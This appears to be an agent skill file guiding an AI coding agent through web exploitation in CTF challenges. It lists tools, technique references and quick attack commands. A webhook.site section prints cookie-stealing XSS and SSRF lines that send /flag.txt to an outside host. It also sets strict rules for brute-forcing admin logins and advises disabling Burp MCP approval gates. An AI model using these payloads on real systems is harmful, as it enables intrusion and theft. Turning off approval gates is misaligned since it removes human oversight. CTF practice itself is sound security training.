---
name: ctf-web
description: Provides web exploitation techniques for CTF challenges. Use when the target is primarily an HTTP application, API, browser client, template engine, identity flow, or smart-contract frontend/backend surface, including XSS, SQLi, SSTI, SSRF, XXE, JWT, auth bypass, file upload, request smuggling, OAuth/OIDC, SAML, prototype pollution, and similar web bugs. Do not use it for native binary memory corruption, reverse engineering of standalone executables, disk or memory forensics, or pure cryptanalysis unless the web flaw is still the main path to the flag.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
  author: Lukasz Jagiello
---

# CTF Web Exploitation

Use this skill as a routing and execution guide for web-heavy challenges. Keep the first pass short: map the app, confirm the trust boundary, and only then dive into the detailed technique notes.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install sqlmap flask-unsign requests httpx
```

**Linux (apt):**
```bash
apt install hashcat jq curl
```

**macOS (Homebrew):**
```bash
brew install hashcat jq curl
```

**Go tools (all platforms, requires Go):**
```bash
go install github.com/ffuf/ffuf/v2@latest
```

**Manual install:**
- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (auto via install script or lazy clone)
  ```bash
  bash scripts/install_ctf_tools.sh pat   # PAT only
  bash scripts/install_ctf_tools.sh all   # all tools including PAT
  # manual fallback:
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
  ```
  > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.

**MCP servers (optional):** Playwright MCP ([microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)) for browser-dependent challenges (DOM XSS, admin bot, SPA client secrets) and Burp Suite MCP ([PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)) for wire-level work (header-level HTTP/1.1+HTTP/2 control, smuggling, blind SSRF/XXE via Collaborator, proxy-history regex mining) — see [tools-mcp.md](tools-mcp.md). Two things to do before relying on Burp MCP: start Burp *before* the agent, and turn off the two approval gates in Burp's MCP tab or the first tool call blocks on a modal dialog.

## Additional Resources

- [sql-injection.md](sql-injection.md) - SQL injection techniques: auth bypass, UNION extraction, filter bypasses, second-order SQLi, truncation, race-assisted leaks, INSERT ON DUPLICATE KEY UPDATE password overwrite, innodb_table_stats WAF bypass
- [server-side.md](server-side.md) - PHP type juggling, php://filter LFI, Python str.format traversal, SSTI (Jinja2, Twig, ERB, Mako, EJS, Vue.js, Smarty), SSRF (Host header, DNS rebinding, curl redirect, unescaped-dot regex, SNI FTP smuggling, mod_vhost_alias), PHP hash_hmac NULL
- [server-side-2.md](server-side-2.md) - XXE (basic, OOB, DOCX upload), XML injection via X-Forwarded-For, PHP variable variables, PHP uniqid predictable filename, sequential regex replacement bypass, command injection (newline, blocklist, sendmail CGI, multi-barcode, git CLI), GraphQL injection (introspection, batching, interpolation)
- [server-side-exec.md](server-side-exec.md) - Direct code execution paths, upload-to-RCE, deserialization-adjacent execution, LaTeX injection, header and API abuses
- [server-side-exec-2.md](server-side-exec-2.md) - More execution chains: SQLi fragmentation, path parser tricks, polyglot uploads, wrapper abuse, filename injection, BMP pixel webshell with filename truncation
- [server-side-deser.md](server-side-deser.md) - Java/Python/PHP deserialization and race-condition playbooks, PHP SoapClient CRLF SSRF via deserialization
- [server-side-advanced.md](server-side-advanced.md) - Advanced SSRF, traversal, archive, parser, framework, and modern app-server issues, Nginx alias traversal
- [server-side-advanced-2.md](server-side-advanced-2.md) - Docker API SSRF, Castor/XML, Apache expression reads, parser discrepancies, Windows path tricks, rogue MySQL server file read
- [server-side-advanced-3.md](server-side-advanced-3.md) - Part 3 (CSAW/35C3/ASIS/PlaidCTF 2018): WAV polyglot upload, multi-slash URL `path.startswith` bypass, Xalan XSLT `math:random()` seed guess, SoapClient `_user_agent` CRLF method smuggling, `gopher:///` no-host URL scheme bypass, SSRF credential leak via attacker-specified outbound URL
- [server-side-advanced-4.md](server-side-advanced-4.md) - Part 4: WeasyPrint SSRF/file read (CVE-2024-28184), MongoDB regex/$where blind oracle, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, wget CRLF SSRF→SMTP, Gopher SSRF to MySQL blind SQLi, React Server Components Flight RCE (CVE-2025-55182), AMQP/TLS interception via sslsplit+arpspoof, CairoSVG XXE, Bazaar repo reconstruction
- [client-side.md](client-side.md) - XSS, CSRF, cache poisoning, DOM tricks, admin bot abuse, request smuggling, paywall bypass
- [client-side-advanced.md](client-side-advanced.md) - CSP bypasses, Unicode tricks, XSSI, CSS exfiltration, browser normalization quirks, postMessage null origin bypass
- [auth-and-access.md](auth-and-access.md) - Auth/authz bypasses, hidden endpoints, IDOR, redirect chains, subdomain takeover, AI chatbot jailbreaks
- [auth-and-access-2.md](auth-and-access-2.md) - Part 2 (2018-era): `std::unordered_set` bucket collision auth bypass, `nodeprep.prepare` Unicode homograph username collision, SRP A=0/A=N auth bypass, ArangoDB AQL MERGE privilege escalation
- [auth-jwt.md](auth-jwt.md) - JWT/JWE manipulation, weak secrets, header injection, key confusion, replay
- [auth-infra.md](auth-infra.md) - OAuth/OIDC, SAML, CORS, CI/CD secrets, IdP abuse, login poisoning
- [node-and-prototype.md](node-and-prototype.md) - Prototype pollution, JS sandbox escape, Node.js attack chains
- [web3.md](web3.md) - Solidity and Web3 challenge notes
- [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
- [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs curl and ffuf
- [python-requests.md](python-requests.md) - Python requests toolkit: session scaffold, Burp-Intruder-like fuzzer (sync + ThreadPoolExecutor + httpx async), payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy
- [pat-reference.md](pat-reference.md) — PayloadsAllTheThings index: bulk payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload (requires PAT clone, see Prerequisites)

## When to Pivot

- If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
- If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
- If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
- If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
- If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.

## Find Similar Writeups

If you are stuck or want to see how others solved similar web challenges, follow the ctf-similar-search skill's methodology — describe the search request in natural language using the challenge name, competition name, or unique strings (code snippets, error messages) from the challenge:

"DASCTF URL Storage"
"def encrypt_flag(key)"

This searches for reference writeups via Tavily API and can help identify the right exploitation path. Avoid generic terms like "SSRF" or "XSS" — use challenge-specific identifiers instead.

## First-Pass Workflow

1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
2. Capture one normal request/response pair for every major feature before fuzzing.
3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.

### Bulk payloads (PayloadsAllTheThings — on-demand)

This skill works without PAT at load time (graceful degrade): `pat-reference.md` and inline exemplars are available offline; bulk payloads require a PAT clone. After mapping the trust boundary (First-Pass Workflow), check [pat-reference.md](pat-reference.md) for the PAT directory that matches your bug class, then search bulk payloads:

```bash
# PAT payload search (requires PAT clone — see Prerequisites; gracefully skipped if missing)
ls ctf-web/payloads/PayloadsAllTheThings 2>/dev/null | head
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/null | head
```

Or via agent tools (no clone required for the index itself):

```text
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "union select" ctf-web/payloads/PayloadsAllTheThings
```

If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clones on demand:

```bash
[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
```

## Quick Start Commands

```bash
# Recon
curl -sI https://target.com
ffuf -u https://target.com/FUZZ -w wordlist.txt
curl -s https://target.com/robots.txt

# SQLi quick test
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# JWT decode (no verification)
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Cookie decode (Flask)
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt

# SSTI probes
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name={{config}}"

# Request inspection
curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
```

## Login Brute-Force — Hard Rules

When a challenge requires brute-forcing a login form, follow these rules EXACTLY. Do NOT improvise.

1. **Username is ALWAYS `admin`.** Do NOT enumerate usernames. Do NOT create username lists. Even when the challenge says "弱口令" (weak password) or "常用用户名" (common usernames), those hints describe the PASSWORD — the target account is still `admin`. Only use a different username if the challenge gives a SPECIFIC different string (e.g., "the username is root").

2. **Password file MUST be an existing Kali wordlist.** The default is `/usr/share/wordlists/metasploit/burnett_top_1024.txt`. Do NOT create your own password file — no `cat > passwords.txt`, no hardcoded password lists in code, no reading from a local `Top1000.txt`. Your script must read lines from the Kali wordlist file directly.

For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, threading), see the reference scripts in [auth-and-access.md](auth-and-access.md) — but those scripts must still follow the two rules above.

## First Questions to Answer

- Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
- Does the app trust user-controlled data in templates, redirects, file paths, headers, serialized objects, or background jobs?
- Are there multiple parsers disagreeing with each other: proxy vs app, URL parser vs fetcher, sanitizer vs browser, serializer vs filter?
- Can you turn the bug into a smaller primitive first: read one file, forge one token, call one internal endpoint, trigger one bot visit?

## High-Value Recon Checks

- Read the HTML, inline scripts, and bundled JS before guessing the API surface.
- Compare what the UI submits with what the backend accepts; optional JSON fields often unlock hidden paths.
- Check obvious metadata and helper paths early: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/debug`, `/.git/`, `/.env`.
- Try alternate verbs and content types on interesting routes: `GET`, `POST`, `PUT`, `PATCH`, `TRACE`, JSON, form, multipart, XML.
- Treat file upload, PDF/export, webhook, OAuth callback, and admin bot features as likely exploit multipliers.

## Fast Pattern Map

- SQL errors, odd filtering, or state-dependent DB behavior: start with [sql-injection.md](sql-injection.md).
- Templating, file reads, SSRF, command execution, XML, or parser bugs: start with [server-side.md](server-side.md) and [server-side-exec.md](server-side-exec.md).
- XSS, CSP bypass, admin bot, client routing, DOM issues, or scriptless exfiltration: start with [client-side.md](client-side.md).
- Session forgery, hidden admin routes, JWT, OAuth, SAML, or weak trust boundaries: start with [auth-and-access.md](auth-and-access.md), [auth-jwt.md](auth-jwt.md), and [auth-infra.md](auth-infra.md).
- Node.js apps, prototype pollution, VM sandboxes, or SSRF into internal services: add [node-and-prototype.md](node-and-prototype.md).
- Smart contract frontends or blockchain-integrated apps: add [web3.md](web3.md).

## Common Chain Shapes

- Recon -> hidden route -> auth bypass -> internal file read -> token or flag
- XSS or HTML injection -> admin bot -> privileged action -> secret leak
- Traversal or upload -> config/source leak -> secret recovery -> session forgery
- SSRF -> metadata or internal API -> credential leak -> code execution
- SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse

## Webhook Callbacks (webhook.site)

For any exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind injection with out-of-band data), use [webhook.site](https://webhook.site) to instantly receive and inspect incoming requests.

**Create a token (get a callback URL):**
```bash
curl -X POST https://webhook.site/token
# Returns {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
# Your callback URL: https://webhook.site/<uuid>
```

**Use the callback URL in your exploit:**
```bash
# XSS payload with webhook callback
curl -X POST https://target.com/api/report \
  -H "Content-Type: application/json" \
  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'

# SSRF exfiltration via webhook
curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"

# OAuth redirect abuse
curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
```

**Retrieve the last received request:**
```bash
curl "https://webhook.site/token/<uuid>/request/latest/raw" \
  -H "accept: application/json" \
  -H "api-key: <uuid>"
```

**When to use webhook.site vs Burp Collaborator vs interactsh:**
- **webhook.site** — fastest setup, browser-visible UI, no install needed; best for quick CTF callbacks
- **Burp Collaborator** — better for blind XSS/SSRF when using Burp Suite as proxy
- **interactsh** — OOB interaction correlation for complex multi-step exploits

## Deep-Dive Notes

Use [field-notes.md](field-notes.md) once you have confirmed the challenge is truly web-heavy and you need the long exploit catalog.

- Recon, SQLi, XSS, traversal, JWT, SSTI, SSRF, XXE, and command injection quick notes
- Deserialization, race conditions, file upload to RCE, and multi-stage chain examples
- Node, OAuth/SAML, CI/CD, Web3, bot abuse, CSP bypasses, and modern browser tricks
- CVE-shaped playbooks and older challenge patterns that still show up in modern CTFs

## Common Flag Locations

- Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`
- Environment: `/proc/self/environ`, process command line, debug config dumps
- Database: tables named `flag`, `flags`, `secret`, or seeded challenge content
- HTTP: custom headers, archived responses, hidden routes, admin exports
- Browser: hidden DOM nodes, `data-*` attributes, inline state objects, source maps
